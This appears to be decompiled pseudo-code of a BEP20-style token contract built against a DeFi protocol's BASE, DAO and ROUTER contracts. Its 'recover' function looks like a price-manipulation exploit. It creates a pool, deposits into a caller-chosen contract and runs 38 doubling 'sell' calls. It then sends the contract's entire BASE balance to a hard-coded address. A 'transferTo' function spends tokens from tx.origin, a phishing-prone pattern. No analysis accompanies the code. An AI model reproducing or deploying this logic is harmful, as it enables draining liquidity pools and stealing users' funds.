contract main {




// =====================  Runtime code  =====================


array of uint256 name;
array of uint256 symbol;
uint256 decimals;
uint256 totalSupply;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
address BASEAddress;
array of address arrayMembers;
address DEPLOYERAddress;
uint256 one;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function arrayMembers(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 < arrayMembers.length
    return arrayMembers[arg1]
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function one() payable {
    return one
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function DEPLOYER() payable {
    return DEPLOYERAddress
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function BASE() payable {
    return BASEAddress
}

function _fallback() payable {
    revert
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'iBEP20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'iBEP20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transferTo(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not tx.origin:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'iBEP20: transfer from the zero address'
    if arg2 > balanceOf[tx.origin]:
        revert with 0, 'SafeMath: subtraction overflow', 0
    balanceOf[tx.origin] -= arg2
    if arg2 + balanceOf[arg1] < balanceOf[arg1]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
    emit Transfer(arg2, tx.origin, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'iBEP20: transfer from the zero address'
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 'SafeMath: subtraction overflow', 0
    balanceOf[address(msg.sender)] -= arg2
    if arg2 + balanceOf[arg1] < balanceOf[arg1]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function burnBalance() payable {
    if DEPLOYERAddress != msg.sender:
        revert with 0, 'Must be DAO'
    require ext_code.size(BASEAddress)
    staticcall BASEAddress.0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_code.size(BASEAddress)
    call BASEAddress.burn(uint256 rg1) with:
         gas gas_remaining wei
        args ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if arg2 > allowance[msg.sender][address(arg1)]:
        revert with 0, 32, 38, 0x656942455032303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572, mem[166 len 26] >> 48, 0
    if not msg.sender:
        revert with 0, 'iBEP20: approve from the zero address'
    if not arg1:
        revert with 0, 'iBEP20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] - arg2
    emit Approval((allowance[msg.sender][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if arg2 + allowance[msg.sender][address(arg1)] < allowance[msg.sender][address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'iBEP20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'iBEP20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2 + allowance[msg.sender][address(arg1)]
    emit Approval((arg2 + allowance[msg.sender][address(arg1)]), msg.sender, arg1);
    return 1
}

function removeLiquidity() payable {
    if DEPLOYERAddress != msg.sender:
        revert with 0, 'Must be DAO'
    require ext_code.size(BASEAddress)
    staticcall BASEAddress.DAO() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    require ext_code.size(address(ext_call.return_data[0]))
    staticcall address(ext_call.return_data[0]).ROUTER() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).removeLiquidity(uint256 rg1, address rg2) with:
         gas gas_remaining wei
        args 10000, this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 64
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'iBEP20: transfer from the zero address'
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: subtraction overflow', 0
    balanceOf[address(arg1)] -= arg3
    if arg3 + balanceOf[arg2] < balanceOf[arg2]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][msg.sender]:
        revert with 0, 
                    32,
                    41,
                    0xfe6942455032303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63, mem[233 len 23] >> 72,
                    0
    if not arg1:
        revert with 0, 'iBEP20: approve from the zero address'
    if not msg.sender:
        revert with 0, 'iBEP20: approve to the zero address'
    allowance[address(arg1)][address(msg.sender)] = allowance[address(arg1)][msg.sender] - arg3
    emit Approval((allowance[address(arg1)][msg.sender] - arg3), arg1, msg.sender);
    return 1
}

function recover(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    mem[100] = msg.sender
    mem[132] = this.address
    mem[164] = arg2
    require ext_code.size(BASEAddress)
    call BASEAddress.0x23b872dd with:
         gas gas_remaining wei
        args msg.sender, address(this.address), arg2
    mem[96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    require ext_code.size(BASEAddress)
    staticcall BASEAddress.DAO() with:
            gas gas_remaining wei
    mem[ceil32(return_data.size) + 96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    require ext_code.size(address(ext_call.return_data[0]))
    staticcall address(ext_call.return_data[0]).ROUTER() with:
            gas gas_remaining wei
    mem[(2 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    if not this.address:
        revert with 0, 'iBEP20: approve from the zero address'
    if not ext_call.return_data[12 len 20]:
        revert with 0, 'iBEP20: approve to the zero address'
    allowance[address(this.address)][address(ext_call.return_data[0])] = totalSupply
    emit Approval(totalSupply, this.address, address(ext_call.return_data[0]));
    require ext_code.size(BASEAddress)
    staticcall BASEAddress.DAO() with:
            gas gas_remaining wei
    mem[(4 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    require ext_code.size(address(ext_call.return_data[0]))
    staticcall address(ext_call.return_data[0]).ROUTER() with:
            gas gas_remaining wei
    mem[(6 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    mem[(7 * ceil32(return_data.size)) + 100] = address(ext_call.return_data[0])
    mem[(7 * ceil32(return_data.size)) + 132] = arg2
    require ext_code.size(BASEAddress)
    call BASEAddress.approve(address rg1, uint256 rg2) with:
         gas gas_remaining wei
        args address(ext_call.return_data[0]), arg2
    mem[(7 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    require ext_code.size(BASEAddress)
    staticcall BASEAddress.DAO() with:
            gas gas_remaining wei
    mem[(8 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    require ext_code.size(address(ext_call.return_data[0]))
    staticcall address(ext_call.return_data[0]).ROUTER() with:
            gas gas_remaining wei
    mem[(10 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    mem[(11 * ceil32(return_data.size)) + 100] = arg2
    mem[(11 * ceil32(return_data.size)) + 132] = 10^11
    mem[(11 * ceil32(return_data.size)) + 164] = this.address
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).createPool(uint256 rg1, uint256 rg2, address rg3) with:
         gas gas_remaining wei
        args arg2, 10^11, this.address
    mem[(11 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    if not this.address:
        revert with 0, 'iBEP20: approve from the zero address'
    if not arg1:
        revert with 0, 'iBEP20: approve to the zero address'
    mem[0] = arg1
    mem[32] = sha3(address(this.address), 5)
    allowance[address(this.address)][address(arg1)] = 10 * one
    emit Approval((10 * one), this.address, arg1);
    mem[(12 * ceil32(return_data.size)) + 100] = this.address
    mem[(12 * ceil32(return_data.size)) + 132] = 2499475 * 10^11
    require ext_code.size(arg1)
    call arg1.deposit(address rg1, uint256 rg2) with:
         gas gas_remaining wei
        args address(this.address), 2499475 * 10^11
    mem[(12 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    mem[64] = (13 * ceil32(return_data.size)) + 96
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    idx = 0
    s = 2155 * 10^14
    while idx < 38:
        require ext_code.size(BASEAddress)
        staticcall BASEAddress.DAO() with:
                gas gas_remaining wei
        mem[mem[64]] = ext_call.return_data[0]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        _74 = mem[64]
        mem[64] = mem[64] + ceil32(return_data.size)
        require return_data.size >= 32
        require mem[_74] == mem[_74 + 12 len 20]
        require ext_code.size(mem[_74 + 12 len 20])
        staticcall mem[_74 + 12 len 20].ROUTER() with:
                gas gas_remaining wei
        mem[mem[64]] = ext_call.return_data[0]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        _83 = mem[64]
        mem[64] = mem[64] + ceil32(return_data.size)
        require return_data.size >= 32
        _85 = mem[_83]
        require mem[_83] == mem[_83 + 12 len 20]
        mem[mem[64] + 36] = this.address
        require ext_code.size(address(_85))
        call address(_85).sell(uint256 rg1, address rg2) with:
             gas gas_remaining wei
            args s, this.address
        mem[mem[64] len 64] = ext_call.return_data[0 len 64]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        mem[64] = mem[64] + ceil32(return_data.size)
        require return_data.size >= 64
        if not s:
            idx = idx + 1
            s = 0
            continue 
        if 2 * s / s != 2:
            revert with 0, 'SafeMath: multiplication overflow'
        idx = idx + 1
        s = 2 * s
        continue 
    mem[mem[64] + 4] = this.address
    require ext_code.size(BASEAddress)
    staticcall BASEAddress.0x70a08231 with:
            gas gas_remaining wei
           args address(this.address)
    mem[mem[64]] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    _75 = mem[64]
    mem[64] = mem[64] + ceil32(return_data.size)
    require return_data.size >= 32
    _77 = mem[_75]
    mem[mem[64] + 4] = BASEAddress
    mem[mem[64] + 36] = _77
    require ext_code.size(BASEAddress)
    call BASEAddress.approve(address rg1, uint256 rg2) with:
         gas gas_remaining wei
        args BASEAddress, _77
    mem[mem[64]] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    _82 = mem[64]
    mem[64] = mem[64] + ceil32(return_data.size)
    require return_data.size >= 32
    require mem[_82] == bool(mem[_82])
    mem[mem[64] + 4] = 0xf2eba4b92fafd47a6403d24a567b38c07d7a5b43
    mem[mem[64] + 36] = _77
    require ext_code.size(BASEAddress)
    call BASEAddress.0xa9059cbb with:
         gas gas_remaining wei
        args 0xf2eba4b92fafd47a6403d24a567b38c07d7a5b43, _77
    mem[mem[64]] = ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    _89 = mem[64]
    mem[64] = mem[64] + ceil32(return_data.size)
    require return_data.size >= 32
    require mem[_89] == bool(mem[_89])
    return 1
}



}
